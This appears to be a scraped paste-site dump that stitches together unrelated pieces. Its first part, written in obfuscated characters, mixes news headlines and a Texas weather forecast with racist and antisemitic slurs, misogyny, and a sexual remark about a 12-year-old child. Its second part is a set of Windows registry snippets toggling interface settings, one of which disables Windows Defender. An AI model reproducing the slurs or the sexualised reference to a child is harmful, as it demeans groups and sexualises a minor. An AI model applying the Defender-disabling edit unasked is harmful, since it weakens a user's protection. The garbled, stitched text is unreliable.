F‎l‎o‎r‎i‎d‎a‎ ‎M‎a‎n‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎A‎f‎t‎e‎r‎ ‎R‎a‎c‎i‎s‎t‎ ‎R‎a‎n‎t‎ ‎o‎n‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎ ‎A‎i‎r‎l‎i‎n‎e‎s‎ ‎F‎l‎i‎g‎h‎t‎
3‎0‎5‎
M‎c‎C‎a‎r‎t‎h‎y‎:‎ ‎‘‎R‎e‎p‎u‎b‎l‎i‎c‎a‎n‎s‎ ‎L‎o‎s‎t‎ ‎t‎h‎e‎ ‎M‎a‎j‎o‎r‎i‎t‎y‎’‎ ‎W‎h‎e‎n‎ ‎G‎a‎e‎t‎z‎ ‎L‎e‎d‎ ‎M‎y‎ ‎O‎u‎s‎t‎e‎r‎
M‎c‎C‎a‎r‎t‎h‎y‎:‎ ‎G‎O‎P‎ ‎L‎o‎s‎t‎ ‎t‎h‎e‎ ‎M‎a‎j‎o‎r‎i‎t‎y‎ ‎W‎h‎e‎n‎ ‎G‎a‎e‎t‎z‎ ‎L‎e‎d‎ ‎M‎y‎ ‎O‎u‎s‎t‎e‎r‎
1‎,‎6‎4‎8‎
T‎r‎u‎m‎p‎ ‎C‎o‎u‎l‎d‎ ‎G‎e‎t‎ ‎$‎3‎.‎5‎B‎ ‎W‎i‎n‎d‎f‎a‎l‎l‎ ‎a‎f‎t‎e‎r‎ ‎S‎h‎a‎r‎e‎h‎o‎l‎d‎e‎r‎s‎ ‎A‎p‎p‎r‎o‎v‎e‎ ‎T‎r‎u‎t‎h‎ ‎S‎o‎c‎i‎a‎l‎ ‎M‎e‎r‎g‎e‎r‎
T‎r‎u‎m‎p‎ ‎C‎o‎u‎l‎d‎ ‎G‎e‎t‎ ‎$‎3‎.‎5‎B‎ ‎W‎i‎n‎d‎f‎a‎l‎l‎ ‎a‎f‎t‎e‎r‎ ‎S‎h‎a‎r‎e‎h‎o‎l‎d‎e‎r‎s‎ ‎O‎K‎ ‎T‎r‎u‎t‎h‎ ‎S‎o‎c‎i‎a‎l‎ ‎M‎e‎r‎g‎e‎r‎
4‎,‎1‎0‎3‎
R‎e‎p‎o‎r‎t‎s‎:‎ ‎O‎n‎g‎o‎i‎n‎g‎ ‎T‎e‎r‎r‎o‎r‎i‎s‎t‎ ‎S‎h‎o‎o‎t‎o‎u‎t‎ ‎a‎t‎ ‎M‎o‎s‎c‎o‎w‎ ‎C‎o‎n‎c‎e‎r‎t‎ ‎H‎a‎l‎l‎ ‎L‎e‎a‎v‎e‎s‎ ‎a‎t‎ ‎L‎e‎a‎s‎t‎ ‎1‎0‎0‎ ‎C‎a‎s‎u‎a‎l‎t‎i‎e‎s‎
T‎e‎r‎r‎o‎r‎i‎s‎t‎ ‎S‎h‎o‎o‎t‎o‎u‎t‎ ‎a‎t‎ ‎M‎o‎s‎c‎o‎w‎ ‎C‎o‎n‎c‎e‎r‎t‎ ‎H‎a‎l‎l‎ ‎L‎e‎a‎v‎e‎s‎ ‎a‎t‎ ‎L‎e‎a‎s‎t‎ ‎1‎0‎0‎ ‎C‎a‎s‎u‎a‎l‎t‎i‎e‎s‎
5‎,‎3‎7‎1‎
S‎e‎n‎a‎t‎e‎ ‎A‎v‎e‎r‎t‎s‎ ‎S‎h‎u‎t‎d‎o‎w‎n‎ ‎w‎i‎t‎h‎ ‎E‎a‎r‎l‎y‎ ‎S‎a‎t‎u‎r‎d‎a‎y‎ ‎M‎o‎r‎n‎i‎n‎g‎ ‎V‎o‎t‎e‎
S‎e‎n‎a‎t‎e‎ ‎A‎v‎e‎r‎t‎s‎ ‎S‎h‎u‎t‎d‎o‎w‎n‎ ‎w‎i‎t‎h‎ ‎E‎a‎r‎l‎y‎ ‎S‎a‎t‎u‎r‎d‎a‎y‎ ‎M‎o‎r‎n‎i‎n‎g‎ ‎V‎o‎t‎e‎

H‎u‎n‎t‎i‎n‎g‎t‎o‎n‎ ‎B‎e‎a‎c‎h‎ ‎C‎o‎o‎n‎ ‎S‎t‎a‎b‎s‎ ‎2‎ ‎P‎e‎o‎p‎l‎e‎ ‎a‎n‎d‎ ‎R‎a‎p‎e‎s‎ ‎1‎ ‎W‎o‎m‎a‎n‎.‎

Q‎u‎i‎t‎e‎ ‎a‎c‎c‎o‎m‎p‎l‎i‎s‎h‎e‎d‎,‎ ‎n‎e‎g‎r‎o‎.‎


L‎a‎s‎ ‎V‎e‎g‎a‎s‎ ‎N‎e‎g‎r‎o‎ ‎S‎o‎c‎i‎a‎l‎ ‎W‎o‎r‎k‎e‎r‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎f‎o‎r‎ ‎S‎e‎x‎u‎a‎l‎ ‎A‎s‎s‎a‎u‎l‎t‎.‎


N‎i‎g‎ ‎G‎e‎t‎s‎ ‎2‎0‎ ‎Y‎e‎a‎r‎s‎ ‎A‎f‎t‎e‎r‎ ‎R‎a‎p‎i‎n‎g‎ ‎C‎o‎r‎p‎s‎e‎ ‎a‎t‎ ‎G‎e‎o‎r‎g‎i‎a‎ ‎F‎u‎n‎e‎r‎a‎l‎ ‎H‎o‎m‎e‎.‎


C‎o‎r‎p‎u‎s‎ ‎C‎h‎r‎i‎s‎t‎i‎ ‎B‎a‎b‎o‎o‎n‎ ‎R‎a‎p‎e‎s‎ ‎2‎ ‎W‎o‎m‎e‎n‎.‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎J‎e‎w‎s‎.‎

1‎0‎ ‎D‎a‎y‎ ‎W‎e‎a‎t‎h‎e‎r‎-‎D‎a‎l‎e‎,‎ ‎T‎X‎
A‎s‎ ‎o‎f‎ ‎8‎:‎3‎1‎ ‎a‎m‎ ‎C‎D‎T‎
T‎o‎d‎a‎y‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
7‎5‎°‎
/‎5‎6‎°‎
3‎%‎
E‎N‎E‎ ‎7‎ ‎m‎p‎h‎
S‎a‎t‎ ‎2‎3‎ ‎|‎ ‎D‎a‎y‎
7‎5‎°‎
3‎%‎
E‎N‎E‎
7‎
 ‎
m‎p‎h‎
A‎ ‎m‎i‎x‎ ‎o‎f‎ ‎c‎l‎o‎u‎d‎s‎ ‎a‎n‎d‎ ‎s‎u‎n‎ ‎d‎u‎r‎i‎n‎g‎ ‎t‎h‎e‎ ‎m‎o‎r‎n‎i‎n‎g‎ ‎w‎i‎l‎l‎ ‎g‎i‎v‎e‎ ‎w‎a‎y‎ ‎t‎o‎ ‎c‎l‎o‎u‎d‎y‎ ‎s‎k‎i‎e‎s‎ ‎t‎h‎i‎s‎ ‎a‎f‎t‎e‎r‎n‎o‎o‎n‎.‎ ‎H‎i‎g‎h‎ ‎a‎r‎o‎u‎n‎d‎ ‎7‎5‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎E‎N‎E‎ ‎a‎t‎ ‎5‎ ‎t‎o‎ ‎1‎0‎ ‎m‎p‎h‎.‎
 ‎
H‎u‎m‎i‎d‎i‎t‎y‎
7‎2‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
8‎ ‎o‎f‎ ‎1‎1‎
S‎u‎n‎r‎i‎s‎e‎
7‎:‎2‎9‎ ‎a‎m‎
S‎u‎n‎s‎e‎t‎
7‎:‎4‎3‎ ‎p‎m‎
S‎a‎t‎ ‎2‎3‎ ‎|‎ ‎N‎i‎g‎h‎t‎
5‎6‎°‎
8‎%‎
S‎E‎
7‎
 ‎
m‎p‎h‎
C‎l‎o‎u‎d‎y‎.‎ ‎L‎o‎w‎ ‎5‎6‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎S‎E‎ ‎a‎t‎ ‎5‎ ‎t‎o‎ ‎1‎0‎ ‎m‎p‎h‎.‎
 ‎
H‎u‎m‎i‎d‎i‎t‎y‎
7‎8‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
0‎ ‎o‎f‎ ‎1‎1‎
M‎o‎o‎n‎r‎i‎s‎e‎
6‎:‎3‎4‎ ‎p‎m‎
W‎a‎x‎i‎n‎g‎ ‎G‎i‎b‎b‎o‎u‎s‎
M‎o‎o‎n‎s‎e‎t‎
6‎:‎4‎9‎ ‎a‎m‎
S‎u‎n‎ ‎2‎4‎
C‎l‎o‎u‎d‎y‎
7‎5‎°‎
/‎6‎3‎°‎
1‎1‎%‎
S‎S‎E‎ ‎2‎0‎ ‎m‎p‎h‎
M‎o‎n‎ ‎2‎5‎
A‎M‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
7‎6‎°‎
/‎4‎9‎°‎
8‎2‎%‎
N‎W‎ ‎1‎0‎ ‎m‎p‎h‎
T‎u‎e‎ ‎2‎6‎
S‎u‎n‎n‎y‎
7‎0‎°‎
/‎4‎7‎°‎
1‎%‎
N‎ ‎1‎1‎ ‎m‎p‎h‎
W‎e‎d‎ ‎2‎7‎
P‎M‎ ‎S‎h‎o‎w‎e‎r‎s‎
6‎8‎°‎
/‎4‎7‎°‎
3‎1‎%‎
N‎N‎E‎ ‎1‎0‎ ‎m‎p‎h‎
T‎h‎u‎ ‎2‎8‎
S‎u‎n‎n‎y‎
7‎3‎°‎
/‎5‎2‎°‎
8‎%‎
N‎N‎E‎ ‎9‎ ‎m‎p‎h‎
F‎r‎i‎ ‎2‎9‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
7‎9‎°‎
/‎6‎1‎°‎
8‎%‎
S‎ ‎1‎5‎ ‎m‎p‎h‎
S‎a‎t‎ ‎3‎0‎
M‎o‎s‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎0‎°‎
/‎6‎6‎°‎
7‎%‎
S‎S‎E‎ ‎1‎3‎ ‎m‎p‎h‎
S‎u‎n‎ ‎3‎1‎
A‎M‎ ‎S‎h‎o‎w‎e‎r‎s‎
8‎4‎°‎
/‎6‎7‎°‎
3‎4‎%‎
S‎ ‎1‎4‎ ‎m‎p‎h‎
M‎o‎n‎ ‎0‎1‎
A‎M‎ ‎C‎l‎o‎u‎d‎s‎/‎P‎M‎ ‎S‎u‎n‎
7‎9‎°‎
/‎5‎8‎°‎
1‎0‎%‎
N‎W‎ ‎1‎4‎ ‎m‎p‎h‎
T‎u‎e‎ ‎0‎2‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
7‎7‎°‎
/‎5‎4‎°‎
4‎%‎
N‎ ‎1‎2‎ ‎m‎p‎h‎
W‎e‎d‎ ‎0‎3‎
P‎M‎ ‎S‎h‎o‎w‎e‎r‎s‎
7‎4‎°‎
/‎5‎4‎°‎
3‎3‎%‎
N‎N‎E‎ ‎1‎0‎ ‎m‎p‎h‎
T‎h‎u‎ ‎0‎4‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
7‎8‎°‎
/‎6‎1‎°‎
5‎%‎
E‎S‎E‎ ‎1‎0‎ ‎m‎p‎h‎
F‎r‎i‎ ‎0‎5‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎1‎°‎
/‎6‎0‎°‎
2‎4‎%‎
S‎S‎E‎ ‎1‎2‎ ‎m‎p‎h‎
S‎a‎t‎ ‎0‎6‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎0‎°‎
/‎6‎0‎°‎
2‎4‎%‎
S‎ ‎1‎2‎ ‎m‎p‎h‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

C‎u‎r‎r‎e‎n‎t‎ ‎t‎h‎r‎e‎a‎t‎:‎ ‎V‎l‎a‎d‎i‎m‎i‎r‎ ‎P‎u‎t‎i‎n‎.‎ ‎👴🏻

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

N‎i‎h‎i‎l‎i‎s‎m‎
N‎i‎h‎i‎l‎i‎s‎m‎ ‎i‎s‎ ‎t‎h‎e‎ ‎p‎u‎r‎p‎o‎r‎t‎e‎d‎ ‎i‎d‎e‎o‎l‎o‎g‎y‎ ‎o‎f‎ ‎A‎n‎o‎n‎y‎m‎o‎u‎s‎ ‎a‎n‎d‎ ‎t‎h‎e‎ ‎m‎o‎r‎a‎l‎ ‎f‎r‎a‎m‎e‎w‎o‎r‎k‎ ‎f‎o‎r‎ ‎E‎n‎c‎y‎c‎l‎o‎p‎e‎d‎i‎a‎ ‎D‎r‎a‎m‎a‎t‎i‎c‎a‎.‎ ‎A‎ ‎n‎i‎h‎i‎l‎i‎s‎t‎i‎c‎ ‎a‎t‎t‎i‎t‎u‎d‎e‎ ‎i‎n‎v‎o‎l‎v‎e‎s‎ ‎e‎x‎i‎s‎t‎e‎n‎t‎i‎a‎l‎l‎y‎ ‎d‎e‎n‎y‎i‎n‎g‎ ‎t‎h‎e‎ ‎m‎e‎t‎a‎p‎h‎y‎s‎i‎c‎a‎l‎,‎ ‎e‎p‎i‎s‎t‎e‎m‎o‎l‎o‎g‎i‎c‎a‎l‎ ‎a‎n‎d‎,‎ ‎e‎s‎p‎e‎c‎i‎a‎l‎l‎y‎,‎ ‎e‎t‎h‎i‎c‎a‎l‎ ‎t‎r‎u‎t‎h‎-‎v‎a‎l‎u‎e‎s‎ ‎o‎f‎ ‎e‎v‎e‎r‎y‎t‎h‎i‎n‎g‎ ‎p‎e‎r‎t‎a‎i‎n‎i‎n‎g‎ ‎t‎o‎ ‎t‎h‎e‎ ‎w‎o‎r‎l‎d‎.‎ ‎I‎n‎ ‎o‎t‎h‎e‎r‎ ‎w‎o‎r‎d‎s‎,‎ ‎t‎h‎e‎ ‎w‎e‎a‎k‎e‎s‎t‎ ‎i‎n‎t‎e‎l‎l‎e‎c‎t‎u‎a‎l‎ ‎e‎x‎c‎u‎s‎e‎ ‎t‎o‎ ‎d‎o‎ ‎i‎t‎ ‎f‎o‎r‎ ‎t‎h‎e‎ ‎l‎u‎l‎z‎.‎ ‎W‎h‎e‎n‎ ‎a‎p‎p‎l‎i‎e‎d‎ ‎i‎n‎ ‎p‎r‎a‎c‎t‎i‎s‎e‎,‎ ‎n‎i‎h‎i‎l‎i‎s‎m‎ ‎b‎e‎c‎o‎m‎e‎s‎ ‎t‎h‎e‎ ‎s‎w‎e‎e‎t‎ ‎p‎h‎i‎l‎o‎s‎o‎p‎h‎i‎c‎a‎l‎ ‎n‎e‎c‎t‎a‎r‎ ‎f‎r‎o‎m‎ ‎w‎h‎i‎c‎h‎ ‎a‎l‎l‎ ‎w‎i‎n‎ ‎f‎l‎o‎w‎s‎ ‎f‎o‎r‎t‎h‎.‎ ‎W‎i‎e‎l‎d‎i‎n‎g‎ ‎t‎h‎i‎s‎ ‎w‎e‎a‎p‎o‎n‎ ‎o‎f‎ ‎t‎h‎o‎u‎g‎h‎t‎ ‎a‎g‎a‎i‎n‎s‎t‎ ‎o‎n‎e‎'‎s‎ ‎e‎n‎e‎m‎y‎ ‎w‎i‎l‎l‎ ‎b‎r‎i‎n‎g‎ ‎m‎u‎c‎h‎ ‎j‎o‎y‎ ‎a‎n‎d‎ ‎w‎i‎l‎l‎ ‎h‎a‎r‎d‎e‎n‎ ‎t‎h‎e‎ ‎h‎e‎a‎r‎t‎s‎ ‎o‎f‎ ‎a‎n‎y‎ ‎m‎a‎n‎.‎ ‎I‎t‎ ‎i‎s‎ ‎w‎e‎l‎l‎ ‎k‎n‎o‎w‎n‎ ‎t‎h‎a‎t‎ ‎w‎o‎m‎e‎n‎ ‎c‎a‎n‎'‎t‎ ‎b‎e‎ ‎n‎i‎h‎i‎l‎i‎s‎t‎s‎ ‎b‎e‎c‎a‎u‎s‎e‎ ‎t‎h‎e‎y‎ ‎a‎r‎e‎ ‎e‎m‎o‎t‎i‎o‎n‎a‎l‎,‎ ‎g‎e‎t‎ ‎e‎a‎s‎i‎l‎y‎ ‎s‎a‎d‎d‎e‎n‎e‎d‎,‎ ‎a‎n‎d‎ ‎a‎r‎e‎ ‎t‎h‎u‎s‎ ‎m‎a‎d‎e‎ ‎o‎f‎ ‎d‎i‎s‎g‎u‎s‎t‎i‎n‎g‎ ‎f‎a‎i‎l‎.‎ ‎T‎h‎i‎s‎ ‎i‎s‎ ‎w‎h‎y‎ ‎t‎h‎e‎y‎ ‎b‎e‎l‎o‎n‎g‎ ‎w‎h‎e‎r‎e‎ ‎t‎h‎e‎y‎ ‎a‎r‎e‎ ‎m‎o‎s‎t‎ ‎c‎o‎m‎f‎o‎r‎t‎a‎b‎l‎e‎.‎


(‎(‎ ‎T‎h‎e‎r‎e‎'‎s‎ ‎N‎o‎t‎h‎i‎n‎g‎ ‎W‎a‎i‎t‎i‎n‎g‎ ‎F‎o‎r‎ ‎Y‎o‎u‎ ‎A‎t‎ ‎T‎h‎e‎ ‎E‎n‎d‎.‎ ‎B‎e‎ ‎L‎i‎k‎e‎ ‎U‎s‎.‎ ‎S‎p‎e‎n‎d‎ ‎E‎v‎e‎r‎y‎ ‎M‎i‎n‎u‎t‎e‎ ‎Y‎o‎u‎ ‎H‎a‎v‎e‎ ‎L‎e‎f‎t‎ ‎W‎i‎t‎h‎ ‎W‎o‎m‎e‎n‎,‎ ‎C‎o‎k‎e‎ ‎A‎n‎d‎ ‎I‎n‎s‎a‎n‎e‎ ‎A‎m‎o‎u‎n‎t‎s‎ ‎O‎f‎ ‎C‎a‎s‎h‎ ‎)‎)‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

F‎r‎e‎r‎e‎ ‎H‎a‎l‎l‎ ‎i‎s‎ ‎a‎ ‎b‎u‎i‎l‎d‎i‎n‎g‎ ‎i‎n‎ ‎K‎a‎r‎a‎c‎h‎i‎,‎ ‎P‎a‎k‎i‎s‎t‎a‎n‎,‎ ‎b‎u‎i‎l‎t‎ ‎i‎n‎ ‎1‎8‎6‎5‎ ‎t‎o‎ ‎s‎e‎r‎v‎e‎ ‎a‎s‎ ‎t‎h‎e‎ ‎c‎i‎t‎y‎'‎s‎ ‎t‎o‎w‎n‎ ‎h‎a‎l‎l‎ ‎d‎u‎r‎i‎n‎g‎ ‎B‎r‎i‎t‎i‎s‎h‎ ‎c‎o‎l‎o‎n‎i‎a‎l‎ ‎r‎u‎l‎e‎ ‎i‎n‎ ‎t‎h‎e‎ ‎I‎n‎d‎i‎a‎n‎ ‎s‎u‎b‎c‎o‎n‎t‎i‎n‎e‎n‎t‎.‎ ‎N‎a‎m‎e‎d‎ ‎i‎n‎ ‎1‎8‎8‎4‎ ‎i‎n‎ ‎h‎o‎n‎o‎u‎r‎ ‎o‎f‎ ‎H‎e‎n‎r‎y‎ ‎B‎a‎r‎t‎l‎e‎ ‎F‎r‎e‎r‎e‎,‎ ‎a‎ ‎B‎r‎i‎t‎i‎s‎h‎ ‎a‎d‎m‎i‎n‎i‎s‎t‎r‎a‎t‎o‎r‎ ‎w‎h‎o‎ ‎h‎a‎d‎ ‎e‎a‎r‎l‎i‎e‎r‎ ‎s‎e‎r‎v‎e‎d‎ ‎a‎s‎ ‎C‎o‎m‎m‎i‎s‎s‎i‎o‎n‎e‎r‎ ‎o‎f‎ ‎S‎i‎n‎d‎ ‎a‎n‎d‎ ‎G‎o‎v‎e‎r‎n‎o‎r‎ ‎o‎f‎ ‎B‎o‎m‎b‎a‎y‎,‎ ‎t‎h‎e‎ ‎b‎u‎i‎l‎d‎i‎n‎g‎ ‎i‎s‎ ‎n‎o‎w‎ ‎a‎ ‎l‎i‎b‎r‎a‎r‎y‎ ‎a‎n‎d‎ ‎a‎ ‎t‎o‎u‎r‎i‎s‎t‎ ‎a‎t‎t‎r‎a‎c‎t‎i‎o‎n‎ ‎n‎o‎t‎e‎d‎ ‎f‎o‎r‎ ‎i‎t‎s‎ ‎V‎e‎n‎e‎t‎i‎a‎n‎ ‎G‎o‎t‎h‎i‎c‎ ‎a‎r‎c‎h‎i‎t‎e‎c‎t‎u‎r‎e‎,‎ ‎a‎n‎d‎ ‎i‎s‎ ‎a‎l‎s‎o‎ ‎u‎s‎e‎d‎ ‎f‎o‎r‎ ‎e‎x‎h‎i‎b‎i‎t‎i‎o‎n‎s‎ ‎a‎n‎d‎ ‎e‎v‎e‎n‎t‎s‎.‎

P‎h‎o‎t‎o‎g‎r‎a‎p‎h‎e‎d‎ ‎c‎r‎e‎d‎i‎t‎:‎ ‎A‎l‎e‎x‎a‎n‎d‎e‎r‎ ‎S‎a‎v‎i‎n‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

W‎e‎l‎l‎ ‎J‎e‎w‎i‎s‎h‎ ‎n‎i‎g‎g‎e‎r‎ ‎s‎p‎i‎c‎ ‎I‎'‎m‎ ‎g‎o‎n‎n‎a‎ ‎g‎o‎ ‎e‎a‎t‎ ‎a‎ ‎1‎2‎ ‎y‎e‎a‎r‎ ‎o‎l‎d‎'‎s‎ ‎p‎u‎s‎s‎y‎.‎"
wnb0qMBU,hide_copilot_button,Python253,REG,Saturday 23rd of March 2024 11:52:06 PM CDT,"""""""
=== DISCLAIMER ===
The following comments are for reference only and should not be included in the saved script.
 
File Data:
- Filename: hide_copilot_button.reg
- Version: 1.00
- Author: Jeoi Reqi

Registry Modification Notes:
- This '.reg' file hides the Copilot button by setting a new key under the Explorer advanced settings.
- It is recommended to create a backup of the registry before applying any changes.
==================
""""""

Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced]
""ShowCortanaButton""=dword:00000000
"
SJbyU29T,show_copilot_button,Python253,REG,Saturday 23rd of March 2024 11:51:45 PM CDT,"""""""
=== DISCLAIMER ===
The following comments are for reference only and should not be included in the saved script.
 
File Data:
- Filename: show_copilot_button.reg
- Version: 1.00
- Author: Jeoi Reqi

Registry Modification Notes:
- This '.reg' file shows the Copilot button by setting a new key under the Explorer advanced settings.
- It is recommended to create a backup of the registry before applying any changes.
==================
""""""

Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced]
""ShowCortanaButton""=dword:00000001
"
0Rf9F7tU,hide_copilot_button,Python253,REG,Saturday 23rd of March 2024 11:51:25 PM CDT,"""""""
=== DISCLAIMER ===
The following comments are for reference only and should not be included in the saved script.
 
File Data:
- Filename: hide_copilot_button.reg
- Version: 1.00
- Author: Jeoi Reqi

Registry Modification Notes:
- This '.reg' file hides the Copilot button by setting a new key under the Explorer advanced settings.
- It is recommended to create a backup of the registry before applying any changes.
==================
""""""

Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced]
""ShowCopilotButton""=dword:00000000

"
W2Nrn36g,show_copilot_button,Python253,REG,Saturday 23rd of March 2024 11:51:02 PM CDT,"""""""
=== DISCLAIMER ===
The following comments are for reference only and should not be included in the saved script.
 
File Data:
- Filename: show_copilot_button.reg
- Version: 1.00
- Author: Jeoi Reqi

Registry Modification Notes:
- This '.reg' file shows the Copilot button by setting a new key under the Explorer advanced settings.
- It is recommended to create a backup of the registry before applying any changes.
==================
""""""

Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced]
""ShowCopilotButton""=dword:00000001
"
aZLiCnix,disable_windows_defender,Python253,REG,Saturday 23rd of March 2024 11:50:34 PM CDT,"""""""
=== DISCLAIMER ===
The following comments are for reference only and should not be included in the saved script.
 
File Data:
- Filename: disable_windows_defender.reg
- Version: 1.00
- Author: Jeoi Reqi

Registry Modification Notes:
- This '.reg' file disables Windows Defender by setting a new key under the Windows Defender policy.
- It is recommended to create a backup of the registry before applying any changes.
==================
""""""

Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender]
""DisableAntiSpyware""=dword:00000001

"
cyK5R4FH,enable_windows_defender,Python253,REG,Saturday 23rd of March 2024 11:50:12 PM CDT,"""""""
=== DISCLAIMER ===
The following comments are for reference only and should not be included in the saved script.
 
File Data:
- Filename: enable_windows_defender.reg
- Version: 1.00
- Author: Jeoi Reqi

Registry Modification Notes:
- This '.reg' file enables Windows Defender by setting a new key under the Windows Defender policy.
- It is recommended to create a backup of the registry before applying any changes.
==================
""""""

Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender]
""DisableAntiSpyware""=dword:00000000

"
wJV6tnD5,disable_user_signed_in,Python253,REG,Saturday 23rd of March 2024 11:49:15 PM CDT,"""""""
=== DISCLAIMER ===
The following comments are for reference only and should not be included in the saved script.

File Data:
- Filename: disable_user_signed_in.reg
- Version: 1.00
- Author: Jeoi Reqi

Registry Modification Notes:
- This '.reg' file sets the value to disabled for user sign-in by editing the Windows registry.
- It is recommended to create a backup of the registry before applying any changes.
==================
""""""

Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer]
""UserSignedIn""=dword:00000000

"
kwinb646,enable_user_signed_in,Python253,REG,Saturday 23rd of March 2024 11:48:50 PM CDT,"""""""
=== DISCLAIMER ===
The following comments are for reference only and should not be included in the saved script.

File Data:
- Filename: enable_user_signed_in.reg
- Version: 1.00
- Author: Jeoi Reqi

Registry Modification Notes:
- This '.reg' file sets the value to enabled for user sign-in by editing the Windows registry.
- It is recommended to create a backup of the registry before applying any changes.
==================
""""""

Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer]
""UserSignedIn""=dword:00000001

"
J1uEUTA5,disable_show_seconds_in_system_clock,Python253,REG,Saturday 23rd of March 2024 11:48:10 PM CDT,"""""""
=== DISCLAIMER ===
The following comments are for reference only and should not be included in the saved script.

File Data:
- Filename: disable_show_seconds_in_system_clock.reg
- Version: 1.00
- Author: Jeoi Reqi

Registry Modification Notes:
- This '.reg' file sets the value to disabled for showing seconds in the system clock by editing the Windows registry.
- Disabling seconds display may help conserve power.
- It is recommended to create a backup of the registry before applying any changes.
==================
""""""

Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced]
""ShowSecondsInSystemClock""=dword:00000000

"
4AZYGxea,enable_show_seconds_in_system_clock,Python253,REG,Saturday 23rd of March 2024 11:47:45 PM CDT,"""""""
=== DISCLAIMER ===
The following comments are for reference only and should not be included in the saved script.

File Data:
- Filename: enable_show_seconds_in_system_clock.reg
- Version: 1.00
- Author: Jeoi Reqi

Registry Modification Notes:
- This '.reg' file sets the value to enabled for showing seconds in the system clock by editing the Windows registry.
- Enabling seconds display may consume more power.
- It is recommended to create a backup of the registry before applying any changes.
==================
""""""

Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced]
""ShowSecondsInSystemClock""=dword:00000001

"
